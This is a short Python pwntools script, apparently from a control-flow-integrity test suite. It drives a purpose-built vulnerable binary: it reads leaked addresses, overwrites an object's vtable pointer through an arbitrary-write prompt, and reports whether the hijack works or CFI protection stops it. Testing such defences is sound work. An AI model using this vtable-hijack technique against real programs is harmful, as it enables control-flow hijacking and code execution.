#!/usr/bin/env python3

import os
from pwn import *

arg_obj_reuse = []
bin_obj_reuse = os.path.dirname(__file__) + "/callback_obj_reuse"

def test_callback_obj_reuse():

    p = process(bin_obj_reuse)


    p.recvuntil(b"UserB address is ")
    leak = p.recvline()
    victim_obj = int(leak.decode().strip(), 16)
    p.recvuntil(b"the diff class vtable address is ")
    leak = p.recvline()
    fake_vtable = int(leak.decode().strip(), 16)

    # navigate
    user_b_name = b"2"
    p.sendlineafter(b"Admin registration", b"0")
    p.sendlineafter(b"UserA registration", b"1")
    p.sendlineafter(b"UserB registration", user_b_name)

    # user_a rename with secret
    p.sendlineafter(b"UserA Rename:", b"Bob\x00")

    # then, we can arbitrary write
    p.sendlineafter(b" ptr:", hex(victim_obj).encode())
    p.sendlineafter(b"*ptr:", hex(fake_vtable).encode())
    response = p.recvrepeat(1)
    p.close()

    res_msg = "Testing hijack to getshell with fake vtable: "
    if b" would do  the Admin work " in response:
        res_msg = "hijack succeeds : X"
    elif b"Hi,I am " + user_b_name in response:
        res_msg = "CFI protected   : V"
    else:
        res_msg = "Jmp to elsewhere: X"
    return res_msg

def benchmarking(verbose=False):
    results = []
    banner = """
    \n###########################\n### Callback-object injection testsuite\n######################\n
    """
    results.append(banner)
    results.append("###########\n # Testing callback_obj_reuse\n###\n")
    r = test_callback_obj_reuse()
    results.append(r)

    if not verbose:
        return

    for result in results:
        print(result)

if __name__ == "__main__":
    benchmarking(True)
